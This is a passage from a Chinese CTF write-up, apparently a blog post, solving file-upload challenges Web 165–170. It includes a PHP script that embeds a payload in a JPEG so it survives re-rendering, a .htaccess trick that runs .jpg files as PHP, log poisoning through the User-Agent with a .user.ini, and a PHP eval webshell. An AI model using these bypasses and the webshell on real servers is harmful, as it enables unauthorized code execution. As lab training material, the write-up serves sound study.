class=\"token punctuation\">{<!-- --></span>\n                        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">readByte</span> <span class=\"token operator\">!==</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token variable\">$stopPos</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$dis</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">seek</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$imageStreamSize</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$stopPos</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$startPos</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$outStream</span> <span class=\"token operator\">=</span>\n                    <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$outStream</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$startPos</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span>\n                    <span class=\"token variable\">$miniPayload</span> <span class=\"token operator\">.</span>\n                    <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span>\n                        <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\0\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nullbytePayloadSize</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span>\n                        <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$outStream</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$startPos</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$imageStreamSize</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token variable\">$nullbytePayloadSize</span><span class=\"token operator\">+</span><span class=\"token variable\">$imageStreamSize</span><span class=\"token operator\">-</span><span class=\"token variable\">$extraBytes</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span>\n                    <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$outStream</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$stopPos</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$correctImage</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token variable\">$outStream</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$outStreamTmp</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">checkImage</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'payload_'</span><span class=\"token operator\">.</span><span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$outStream</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Success!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'payload_'</span><span class=\"token operator\">.</span><span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Something\\'s wrong'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">checkImage</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$unlink</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$correctImage</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$correctImage</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">imagecreatefromjpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$unlink</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$correctImage</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">custom_error_handler</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errno</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errfile</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errline</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$extraBytes</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$correctImage</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$correctImage</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/(\\d+) extraneous bytes before marker/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$extraBytes</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">int</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">DataInputStream</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$binData</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$order</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$size</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$order</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$fromString</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">order</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$order</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$fromString</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'File not exists ['</span><span class=\"token operator\">.</span><span class=\"token variable\">$filename</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">size</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">seek</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">size</span> <span class=\"token operator\">-</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">skip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$skip</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$skip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">readByte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">eof</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'End Of File'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$byte</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$byte</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">readShort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'End Of File'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$short</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">order</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$short</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$short</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$short</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$short</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$short</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$short</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$short</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">eof</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token operator\">!</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token class-name\">binData</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">binData</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>先上传一张jpg图片然后下载到本地重命名为<code>2.jpg</code>，再用jpg脚本生成<code>payload_2.jpg</code><br/> <img alt=\"在这里插入图片描述\" src=\"image\\d448b402619249439675313bd10412b9.png\"/><br/> a为文件名</p>\n<pre><code class=\"prism language-php\">php jpg二次渲染<span class=\"token operator\">.</span>php a<span class=\"token operator\">.</span>jpg\n</code></pre>\n<p>在上传<code>payload_2.jpg</code>，抓包<br/> <img alt=\"在这里插入图片描述\" src=\"image\\59058ea786c041e68b1150a7a8744c70.png\"/></p>\n<p><strong>注：</strong><br/> jpg脚本需在<code>linux</code>环境下运行,我的系统为<code>ubuntu</code></p>\n<p><strong>安装php</strong></p>\n<pre><code class=\"prism language-php\">sudo apt<span class=\"token operator\">-</span>get install php\n</code></pre>\n<p>发现报错，需要重新寻找更新源<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4b5ba211ffee4f338fb2dae569d3cb18.png\"/><br/> <strong>解决方法如下：</strong></p>\n<pre><code class=\"prism language-php\">sudo vim sources<span class=\"token operator\">.</span><span class=\"token keyword\">list</span>\n\ndeb <span class=\"token argument-name\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//mirrors.aliyun.com/ubuntu/ raring main restricted universe multiverse  deb http://mirrors.aliyun.com/ubuntu/ raring-security main restricted universe multiverse  deb http://mirrors.aliyun.com/ubuntu/ raring-updates main restricted universe multiverse  deb http://mirrors.aliyun.com/ubuntu/ raring-proposed main restricted universe multiverse  deb http://mirrors.aliyun.com/ubuntu/ raring-backports main restricted universe multiverse  deb-src http://mirrors.aliyun.com/ubuntu/ raring main restricted universe multiverse  deb-src http://mirrors.aliyun.com/ubuntu/ raring-security main restricted universe multiverse  deb-src http://mirrors.aliyun.com/ubuntu/ raring-updates main restricted universe multiverse  deb-src http://mirrors.aliyun.com/ubuntu/ raring-proposed main restricted universe multiverse  deb-src http://mirrors.aliyun.com/ubuntu/ raring-backports main restricted universe multiverse  </span>\n\n\n\nsudo apt<span class=\"token operator\">-</span>get update\nsudo apt<span class=\"token operator\">-</span>get install php\n\njpg脚本需要php<span class=\"token operator\">-</span>gd库，下面为下载流程\nsudo apt<span class=\"token operator\">-</span>cache search php<span class=\"token operator\">-</span>gd（查询需要的php<span class=\"token operator\">-</span>gd版本）\nsudo apt<span class=\"token operator\">-</span>get install php7<span class=\"token operator\">.</span><span class=\"token number\">4</span><span class=\"token operator\">-</span>gd\nsudo php <span class=\"token operator\">-</span>m（查看gd是否安装成功）\n</code></pre>\n<h1><a id=\"Web_166_379\"></a>Web 166</h1>\n<p>发现只可以上传zip文件<br/> <img alt=\"在这里插入图片描述\" src=\"image\\cdc9581cc4f74b7cad3505e8b695e25a.png\"/><br/> 在zip文件里加入一句话木马，上传抓包<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4f8fde1f4d8742dd939fd0c4d1f6fd35.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\0d9e715bd8f043a98be8b3c3d5fa3570.png\"/></p>\n<h1><a id=\"Web_167_387\"></a>Web 167</h1>\n<h2><a id=\"Apache_389\"></a>考点：Apache的包含解析</h2>\n<p><code>.htaccess</code>进行绕过了<br/> 首先上传<code>.htaccess</code></p>\n<pre><code class=\"prism language-php\">AddType application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>httpd<span class=\"token operator\">-</span>php <span class=\"token operator\">.</span>jpg \n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\5027f5a244ef40988ddb9d8bfb8e19c4.png\"/>再上传一句话木马<br/> <img alt=\"在这里插入图片描述\" src=\"image\\15569bee7a3b44628b75c52743270068.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\e5dbbd06d4514e0898a1680a2b292615.png\"/></p>\n<h1><a id=\"Web_168_404\"></a>Web 168</h1>\n<h2><a id=\"_406\"></a>考点：免杀，过滤了好多执行函数</h2>\n<p>上传<code>png文件</code>抓包，修改文件后缀为<code>php</code>，加入<code>免杀代码</code><br/> <img alt=\"在这里插入图片描述\" src=\"image\\63fe16efd78547588636c8c322aa2890.png\"/>直接访问<code>upload/1.php</code><br/> 查看源码即可得到flag<br/> <img alt=\"在这里插入图片描述\" src=\"image\\8737bdb927794f1eabba94de57051473.png\"/></p>\n<h1><a id=\"Web_169_414\"></a>Web 169</h1>\n<h2><a id=\"php__416\"></a>考点：免杀，主要是过滤了php, &lt;&gt;等</h2>\n<p>创建<code>index.php</code>文件，因为<code>日志</code>文件内容将会在index.php中显现<br/> <img alt=\"在这里插入图片描述\" src=\"image\\d8605e4a6c2f445ca909e3d60e20201a.png\"/>在<code>UA</code>中加入一句话木马<br/> <img alt=\"在这里插入图片描述\" src=\"image\\758232cc97aa48fa924236620081dad2.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\782f688562124ab695e5a096124f7229.png\"/><code>phpinfo()</code>可作为瞄点</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\47827e3b186e4865af48db8b2bbff73a.png\"/></p>\n<h1><a id=\"Web_170_427\"></a>Web 170</h1>\n<p>先上传一个zip，然后抓包，改<code>Content-Type</code>为<code>image/png</code>，可以传php等格式，但是发现文件内容过滤了 <code>&lt;&gt; php $</code></p>\n<p>发现可以上传 <code>.user.ini</code> 文件</p>\n<pre><code class=\"prism language-php\"><span class=\"token constant\">GIF89A</span>\nauto_append_file<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/var/log/nginx/access.log\"</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ad830e0c7e4d47edb25afcb6345ce278.png\"/></p>\n<p>UA添加小马</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'shell'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\bd00aa0be25b419c9f08b69b8b0279af.png\"/></p>\n<p>蚁剑相连<br/> <img alt=\"在这里插入图片描述\" src=\"image\\184e0f08420542d284a1608637d3fef7.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\86a572c6e1da403282cd3c637d2f7b88.png\"/><img alt=\"在这里插入图片描述\" src=\"image\\407ed9cb37b0444b869137486158f4a1.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}